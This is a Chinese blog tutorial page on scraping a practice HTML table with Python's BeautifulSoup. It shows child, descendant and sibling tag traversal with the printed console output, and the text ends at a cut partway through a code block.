<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\ywx813\anaconda3\python.exe D:/PythonProject/Crawler/test.py</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;tr&gt;&lt;th&gt; <span class="comment">/* 打印&lt;tr&gt;(内容为&lt;th&gt;) */</span></span><br><span class="line">Item Title</span><br><span class="line">&lt;/th&gt;&lt;th&gt;</span><br><span class="line">Description</span><br><span class="line">&lt;/th&gt;&lt;th&gt;</span><br><span class="line">Cost</span><br><span class="line">&lt;/th&gt;&lt;th&gt;</span><br><span class="line">Image</span><br><span class="line">&lt;/th&gt;&lt;/tr&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;tr <span class="class"><span class="keyword">class</span>=</span><span class="string">&quot;gift&quot;</span> id=<span class="string">&quot;gift1&quot;</span>&gt;&lt;td&gt; <span class="comment">/* 打印&lt;tr&gt;(内容为&lt;td&gt;) */</span></span><br><span class="line">Vegetable Basket</span><br><span class="line">&lt;/td&gt;&lt;td&gt;</span><br><span class="line">This vegetable basket is the perfect gift <span class="keyword">for</span> your health conscious (<span class="keyword">or</span> overweight) friends!</span><br><span class="line">&lt;span class=<span class="string">&quot;excitingNote&quot;</span>&gt;Now with super-colorful bell peppers!&lt;/span&gt;</span><br><span class="line">&lt;/td&gt;&lt;td&gt;</span><br><span class="line">$<span class="number">15.00</span></span><br><span class="line">&lt;/td&gt;&lt;td&gt;</span><br><span class="line">&lt;img src=<span class="string">&quot;../img/gifts/img1.jpg&quot;</span>/&gt;</span><br><span class="line">&lt;/td&gt;&lt;/tr&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;tr class=<span class="string">&quot;gift&quot;</span> id=<span class="string">&quot;gift2&quot;</span>&gt;&lt;td&gt;</span><br><span class="line">Russian Nesting Dolls</span><br><span class="line">&lt;/td&gt;&lt;td&gt;</span><br><span class="line">Hand-painted by trained monkeys, these exquisite dolls are priceless! And by <span class="string">&quot;priceless,&quot;</span> we mean <span class="string">&quot;extremely expensive&quot;</span>! &lt;span class=<span class="string">&quot;excitingNote&quot;</span>&gt;<span class="number">8</span> entire dolls per <span class="built_in">set</span>! Octuple the presents!&lt;/span&gt;</span><br><span class="line">&lt;/td&gt;&lt;td&gt;</span><br><span class="line">$<span class="number">10</span>,<span class="number">000.52</span></span><br><span class="line">&lt;/td&gt;&lt;td&gt;</span><br><span class="line">&lt;img src=<span class="string">&quot;../img/gifts/img2.jpg&quot;</span>/&gt;</span><br><span class="line">&lt;/td&gt;&lt;/tr&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;tr class=<span class="string">&quot;gift&quot;</span> id=<span class="string">&quot;gift3&quot;</span>&gt;&lt;td&gt;</span><br><span class="line">Fish Painting</span><br><span class="line">&lt;/td&gt;&lt;td&gt;</span><br><span class="line">If something seems fishy about <span class="keyword">this</span> painting, it<span class="number">&#x27;</span>s because it<span class="number">&#x27;</span>s a fish! &lt;span class=<span class="string">&quot;excitingNote&quot;</span>&gt;Also hand-painted by trained monkeys!&lt;/span&gt;</span><br><span class="line">&lt;/td&gt;&lt;td&gt;</span><br><span class="line">$<span class="number">10</span>,<span class="number">005.00</span></span><br><span class="line">&lt;/td&gt;&lt;td&gt;</span><br><span class="line">&lt;img src=<span class="string">&quot;../img/gifts/img3.jpg&quot;</span>/&gt;</span><br><span class="line">&lt;/td&gt;&lt;/tr&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;tr class=<span class="string">&quot;gift&quot;</span> id=<span class="string">&quot;gift4&quot;</span>&gt;&lt;td&gt;</span><br><span class="line">Dead Parrot</span><br><span class="line">&lt;/td&gt;&lt;td&gt;</span><br><span class="line">This is an ex-parrot! &lt;span class=<span class="string">&quot;excitingNote&quot;</span>&gt;Or maybe he<span class="number">&#x27;</span>s only resting?&lt;/span&gt;</span><br><span class="line">&lt;/td&gt;&lt;td&gt;</span><br><span class="line">$<span class="number">0.50</span></span><br><span class="line">&lt;/td&gt;&lt;td&gt;</span><br><span class="line">&lt;img src=<span class="string">&quot;../img/gifts/img4.jpg&quot;</span>/&gt;</span><br><span class="line">&lt;/td&gt;&lt;/tr&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;tr class=<span class="string">&quot;gift&quot;</span> id=<span class="string">&quot;gift5&quot;</span>&gt;&lt;td&gt;</span><br><span class="line">Mystery Box</span><br><span class="line">&lt;/td&gt;&lt;td&gt;</span><br><span class="line">If you love suprises, <span class="keyword">this</span> mystery box is <span class="keyword">for</span> you! Do <span class="keyword">not</span> place on light-colored surfaces. May cause oil staining. &lt;span class=<span class="string">&quot;excitingNote&quot;</span>&gt;Keep your friends guessing!&lt;/span&gt;</span><br><span class="line">&lt;/td&gt;&lt;td&gt;</span><br><span class="line">$<span class="number">1.50</span></span><br><span class="line">&lt;/td&gt;&lt;td&gt;</span><br><span class="line">&lt;img src=<span class="string">&quot;../img/gifts/img6.jpg&quot;</span>/&gt;</span><br><span class="line">&lt;/td&gt;&lt;/tr&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">进程已结束，退出代码 <span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>直观来看，下图中的标签就是“giftList”的子标签，程序就打印了对应几个 <code>&lt;tr&gt;</code> 框架</p>
<img src="/2022/04/02/Python%E7%BD%91%E7%BB%9C%E6%95%B0%E6%8D%AE%E9%87%87%E9%9B%86/1648690984152.png" class width="1648690984152"> 
<p><strong>采用 .descendants，则可以打印所有后代标签</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line">from bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">html = urlopen(<span class="string">&quot;http://www.pythonscraping.com/pages/page3.html&quot;</span>)</span><br><span class="line">bsObj = BeautifulSoup(html,<span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> child in bsObj.find(<span class="string">&quot;table&quot;</span>,&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;giftList&quot;</span>&#125;).descendants:</span><br><span class="line">    print(child)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\ywx813\anaconda3\python.exe D:/PythonProject/Crawler/test.py</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;tr&gt;&lt;th&gt; <span class="comment">/* 打印&lt;tr&gt; */</span></span><br><span class="line">Item Title</span><br><span class="line">&lt;/th&gt;&lt;th&gt;</span><br><span class="line">Description</span><br><span class="line">&lt;/th&gt;&lt;th&gt;</span><br><span class="line">Cost</span><br><span class="line">&lt;/th&gt;&lt;th&gt;</span><br><span class="line">Image</span><br><span class="line">&lt;/th&gt;&lt;/tr&gt;</span><br><span class="line">&lt;th&gt; <span class="comment">/* 打印&lt;th&gt; */</span></span><br><span class="line">Item Title</span><br><span class="line">&lt;/th&gt;</span><br><span class="line"></span><br><span class="line">Item Title <span class="comment">/* 打印&lt;th&gt;框架中的内容 */</span></span><br><span class="line"></span><br><span class="line">&lt;th&gt;</span><br><span class="line">Description</span><br><span class="line">&lt;/th&gt;</span><br><span class="line"></span><br><span class="line">Description </span><br><span class="line"></span><br><span class="line">&lt;th&gt;</span><br><span class="line">Cost</span><br><span class="line">&lt;/th&gt;</span><br><span class="line"></span><br><span class="line">Cost </span><br><span class="line"></span><br><span class="line">&lt;th&gt;</span><br><span class="line">Image</span><br><span class="line">&lt;/th&gt;</span><br><span class="line"></span><br><span class="line">Image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;tr <span class="class"><span class="keyword">class</span>=</span><span class="string">&quot;gift&quot;</span> id=<span class="string">&quot;gift1&quot;</span>&gt;&lt;td&gt; <span class="comment">/* 打印&lt;tr&gt; */</span></span><br><span class="line">Vegetable Basket</span><br><span class="line">&lt;/td&gt;&lt;td&gt;</span><br><span class="line">This vegetable basket is the perfect gift <span class="keyword">for</span> your health conscious (<span class="keyword">or</span> overweight) friends!</span><br><span class="line">&lt;span class=<span class="string">&quot;excitingNote&quot;</span>&gt;Now with super-colorful bell peppers!&lt;/span&gt;</span><br><span class="line">&lt;/td&gt;&lt;td&gt;</span><br><span class="line">$<span class="number">15.00</span></span><br><span class="line">&lt;/td&gt;&lt;td&gt;</span><br><span class="line">&lt;img src=<span class="string">&quot;../img/gifts/img1.jpg&quot;</span>/&gt;</span><br><span class="line">&lt;/td&gt;&lt;/tr&gt;</span><br><span class="line">&lt;td&gt; <span class="comment">/* 打印&lt;td&gt; */</span></span><br><span class="line">Vegetable Basket</span><br><span class="line">&lt;/td&gt;</span><br><span class="line"></span><br><span class="line">Vegetable Basket <span class="comment">/* 打印&lt;td&gt;框架中的内容 */</span></span><br><span class="line"></span><br><span class="line">&lt;td&gt; <span class="comment">/* 打印&lt;td&gt; */</span></span><br><span class="line">This vegetable basket is the perfect gift <span class="keyword">for</span> your health conscious (<span class="keyword">or</span> overweight) friends!</span><br><span class="line">&lt;span class=<span class="string">&quot;excitingNote&quot;</span>&gt;Now with super-colorful bell peppers!&lt;/span&gt;</span><br><span class="line">&lt;/td&gt;</span><br><span class="line"></span><br><span class="line">This vegetable basket is the perfect gift <span class="keyword">for</span> your health conscious (<span class="keyword">or</span> overweight) friends!  <span class="comment">/* 打印&lt;td&gt;框架中的内容 */</span></span><br><span class="line"></span><br><span class="line">&lt;span class=<span class="string">&quot;excitingNote&quot;</span>&gt;Now with super-colorful bell peppers!&lt;/span&gt;</span><br><span class="line">Now with super-colorful bell peppers!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;td&gt; <span class="comment">/* 打印&lt;td&gt; */</span></span><br><span class="line">$<span class="number">15.00</span> <span class="comment">/* 打印&lt;td&gt;框架中的内容 */</span></span><br><span class="line">&lt;/td&gt;</span><br><span class="line"></span><br><span class="line">$<span class="number">15.00</span></span><br><span class="line"></span><br><span class="line">&lt;td&gt;</span><br><span class="line">&lt;img src=<span class="string">&quot;../img/gifts/img1.jpg&quot;</span>/&gt;</span><br><span class="line">&lt;/td&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;img src=<span class="string">&quot;../img/gifts/img1.jpg&quot;</span>/&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;tr class=<span class="string">&quot;gift&quot;</span> id=<span class="string">&quot;gift2&quot;</span>&gt;&lt;td&gt;</span><br><span class="line">Russian Nesting Dolls</span><br><span class="line">&lt;/td&gt;&lt;td&gt;</span><br><span class="line">Hand-painted by trained monkeys, these exquisite dolls are priceless! And by <span class="string">&quot;priceless,&quot;</span> we mean <span class="string">&quot;extremely expensive&quot;</span>! &lt;span class=<span class="string">&quot;excitingNote&quot;</span>&gt;<span class="number">8</span> entire dolls per <span class="built_in">set</span>! Octuple the presents!&lt;/span&gt;</span><br><span class="line">&lt;/td&gt;&lt;td&gt;</span><br><span class="line">$<span class="number">10</span>,<span class="number">000.52</span></span><br><span class="line">&lt;/td&gt;&lt;td&gt;</span><br><span class="line">&lt;img src=<span class="string">&quot;../img/gifts/img2.jpg&quot;</span>/&gt;</span><br><span class="line">&lt;/td&gt;&lt;/tr&gt;</span><br><span class="line">&lt;td&gt;</span><br><span class="line">Russian Nesting Dolls</span><br><span class="line">&lt;/td&gt;</span><br><span class="line"></span><br><span class="line">Russian Nesting Dolls</span><br><span class="line"></span><br><span class="line">&lt;td&gt;</span><br><span class="line">Hand-painted by trained monkeys, these exquisite dolls are priceless! And by <span class="string">&quot;priceless,&quot;</span> we mean <span class="string">&quot;extremely expensive&quot;</span>! &lt;span class=<span class="string">&quot;excitingNote&quot;</span>&gt;<span class="number">8</span> entire dolls per <span class="built_in">set</span>! Octuple the presents!&lt;/span&gt;</span><br><span class="line">&lt;/td&gt;</span><br><span class="line"></span><br><span class="line">Hand-painted by trained monkeys, these exquisite dolls are priceless! And by <span class="string">&quot;priceless,&quot;</span> we mean <span class="string">&quot;extremely expensive&quot;</span>! </span><br><span class="line">&lt;span class=<span class="string">&quot;excitingNote&quot;</span>&gt;<span class="number">8</span> entire dolls per <span class="built_in">set</span>! Octuple the presents!&lt;/span&gt;</span><br><span class="line"><span class="number">8</span> entire dolls per <span class="built_in">set</span>! Octuple the presents!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;td&gt;</span><br><span class="line">$<span class="number">10</span>,<span class="number">000.52</span></span><br><span class="line">&lt;/td&gt;</span><br><span class="line"></span><br><span class="line">$<span class="number">10</span>,<span class="number">000.52</span></span><br><span class="line"></span><br><span class="line">&lt;td&gt;</span><br><span class="line">&lt;img src=<span class="string">&quot;../img/gifts/img2.jpg&quot;</span>/&gt;</span><br><span class="line">&lt;/td&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;img src=<span class="string">&quot;../img/gifts/img2.jpg&quot;</span>/&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;tr class=<span class="string">&quot;gift&quot;</span> id=<span class="string">&quot;gift3&quot;</span>&gt;&lt;td&gt;</span><br><span class="line">Fish Painting</span><br><span class="line">&lt;/td&gt;&lt;td&gt;</span><br><span class="line">If something seems fishy about <span class="keyword">this</span> painting, it<span class="number">&#x27;</span>s because it<span class="number">&#x27;</span>s a fish! &lt;span class=<span class="string">&quot;excitingNote&quot;</span>&gt;Also hand-painted by trained monkeys!&lt;/span&gt;</span><br><span class="line">&lt;/td&gt;&lt;td&gt;</span><br><span class="line">$<span class="number">10</span>,<span class="number">005.00</span></span><br><span class="line">&lt;/td&gt;&lt;td&gt;</span><br><span class="line">&lt;img src=<span class="string">&quot;../img/gifts/img3.jpg&quot;</span>/&gt;</span><br><span class="line">&lt;/td&gt;&lt;/tr&gt;</span><br><span class="line">&lt;td&gt;</span><br><span class="line">Fish Painting</span><br><span class="line">&lt;/td&gt;</span><br><span class="line"></span><br><span class="line">Fish Painting</span><br><span class="line"></span><br><span class="line">&lt;td&gt;</span><br><span class="line">If something seems fishy about <span class="keyword">this</span> painting, it<span class="number">&#x27;</span>s because it<span class="number">&#x27;</span>s a fish! &lt;span class=<span class="string">&quot;excitingNote&quot;</span>&gt;Also hand-painted by trained monkeys!&lt;/span&gt;</span><br><span class="line">&lt;/td&gt;</span><br><span class="line"></span><br><span class="line">If something seems fishy about <span class="keyword">this</span> painting, it<span class="number">&#x27;</span>s because it<span class="number">&#x27;</span>s a fish! </span><br><span class="line">&lt;span class=<span class="string">&quot;excitingNote&quot;</span>&gt;Also hand-painted by trained monkeys!&lt;/span&gt;</span><br><span class="line">Also hand-painted by trained monkeys!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;td&gt;</span><br><span class="line">$<span class="number">10</span>,<span class="number">005.00</span></span><br><span class="line">&lt;/td&gt;</span><br><span class="line"></span><br><span class="line">$<span class="number">10</span>,<span class="number">005.00</span></span><br><span class="line"></span><br><span class="line">&lt;td&gt;</span><br><span class="line">&lt;img src=<span class="string">&quot;../img/gifts/img3.jpg&quot;</span>/&gt;</span><br><span class="line">&lt;/td&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;img src=<span class="string">&quot;../img/gifts/img3.jpg&quot;</span>/&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;tr class=<span class="string">&quot;gift&quot;</span> id=<span class="string">&quot;gift4&quot;</span>&gt;&lt;td&gt;</span><br><span class="line">Dead Parrot</span><br><span class="line">&lt;/td&gt;&lt;td&gt;</span><br><span class="line">This is an ex-parrot! &lt;span class=<span class="string">&quot;excitingNote&quot;</span>&gt;Or maybe he<span class="number">&#x27;</span>s only resting?&lt;/span&gt;</span><br><span class="line">&lt;/td&gt;&lt;td&gt;</span><br><span class="line">$<span class="number">0.50</span></span><br><span class="line">&lt;/td&gt;&lt;td&gt;</span><br><span class="line">&lt;img src=<span class="string">&quot;../img/gifts/img4.jpg&quot;</span>/&gt;</span><br><span class="line">&lt;/td&gt;&lt;/tr&gt;</span><br><span class="line">&lt;td&gt;</span><br><span class="line">Dead Parrot</span><br><span class="line">&lt;/td&gt;</span><br><span class="line"></span><br><span class="line">Dead Parrot</span><br><span class="line"></span><br><span class="line">&lt;td&gt;</span><br><span class="line">This is an ex-parrot! &lt;span class=<span class="string">&quot;excitingNote&quot;</span>&gt;Or maybe he<span class="number">&#x27;</span>s only resting?&lt;/span&gt;</span><br><span class="line">&lt;/td&gt;</span><br><span class="line"></span><br><span class="line">This is an ex-parrot! </span><br><span class="line">&lt;span class=<span class="string">&quot;excitingNote&quot;</span>&gt;Or maybe he<span class="number">&#x27;</span>s only resting?&lt;/span&gt;</span><br><span class="line">Or maybe he<span class="number">&#x27;</span>s only resting?</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;td&gt;</span><br><span class="line">$<span class="number">0.50</span></span><br><span class="line">&lt;/td&gt;</span><br><span class="line"></span><br><span class="line">$<span class="number">0.50</span></span><br><span class="line"></span><br><span class="line">&lt;td&gt;</span><br><span class="line">&lt;img src=<span class="string">&quot;../img/gifts/img4.jpg&quot;</span>/&gt;</span><br><span class="line">&lt;/td&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;img src=<span class="string">&quot;../img/gifts/img4.jpg&quot;</span>/&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;tr class=<span class="string">&quot;gift&quot;</span> id=<span class="string">&quot;gift5&quot;</span>&gt;&lt;td&gt;</span><br><span class="line">Mystery Box</span><br><span class="line">&lt;/td&gt;&lt;td&gt;</span><br><span class="line">If you love suprises, <span class="keyword">this</span> mystery box is <span class="keyword">for</span> you! Do <span class="keyword">not</span> place on light-colored surfaces. May cause oil staining. &lt;span class=<span class="string">&quot;excitingNote&quot;</span>&gt;Keep your friends guessing!&lt;/span&gt;</span><br><span class="line">&lt;/td&gt;&lt;td&gt;</span><br><span class="line">$<span class="number">1.50</span></span><br><span class="line">&lt;/td&gt;&lt;td&gt;</span><br><span class="line">&lt;img src=<span class="string">&quot;../img/gifts/img6.jpg&quot;</span>/&gt;</span><br><span class="line">&lt;/td&gt;&lt;/tr&gt;</span><br><span class="line">&lt;td&gt;</span><br><span class="line">Mystery Box</span><br><span class="line">&lt;/td&gt;</span><br><span class="line"></span><br><span class="line">Mystery Box</span><br><span class="line"></span><br><span class="line">&lt;td&gt;</span><br><span class="line">If you love suprises, <span class="keyword">this</span> mystery box is <span class="keyword">for</span> you! Do <span class="keyword">not</span> place on light-colored surfaces. May cause oil staining. &lt;span class=<span class="string">&quot;excitingNote&quot;</span>&gt;Keep your friends guessing!&lt;/span&gt;</span><br><span class="line">&lt;/td&gt;</span><br><span class="line"></span><br><span class="line">If you love suprises, <span class="keyword">this</span> mystery box is <span class="keyword">for</span> you! Do <span class="keyword">not</span> place on light-colored surfaces. May cause oil staining. </span><br><span class="line">&lt;span class=<span class="string">&quot;excitingNote&quot;</span>&gt;Keep your friends guessing!&lt;/span&gt;</span><br><span class="line">Keep your friends guessing!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;td&gt;</span><br><span class="line">$<span class="number">1.50</span></span><br><span class="line">&lt;/td&gt;</span><br><span class="line"></span><br><span class="line">$<span class="number">1.50</span></span><br><span class="line"></span><br><span class="line">&lt;td&gt;</span><br><span class="line">&lt;img src=<span class="string">&quot;../img/gifts/img6.jpg&quot;</span>/&gt;</span><br><span class="line">&lt;/td&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;img src=<span class="string">&quot;../img/gifts/img6.jpg&quot;</span>/&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">进程已结束，退出代码 <span class="number">0</span></span><br></pre></td></tr></table></figure>
<img src="/2022/04/02/Python%E7%BD%91%E7%BB%9C%E6%95%B0%E6%8D%AE%E9%87%87%E9%9B%86/1648691319757.png" class width="1648691319757"> 
<p>可以发现，程序不仅打印了对应几个 <code>&lt;tr&gt;</code> 框架，并且把其后代标签的框架与内容也打印了出来</p>
<p><strong>处理兄弟标签</strong></p>
<p>BeautifulSoup 的 next_siblings() 函数可以让收集表格数据成为简单的事情，尤其是处理带标题行的表格： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">html = urlopen(<span class="string">&quot;http://www.pythonscraping.com/pages/page3.html&quot;</span>)</span><br><span class="line">bsObj = BeautifulSoup(html,<span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> sibling <span class="keyword">in</span> bsObj.find(<span class="string">&quot;table&quot;</span>,&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;giftList&quot;</span>&#125;).tr.next_siblings:</span><br><span class="line">    <span class="built_in">print</span>(sibling)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span 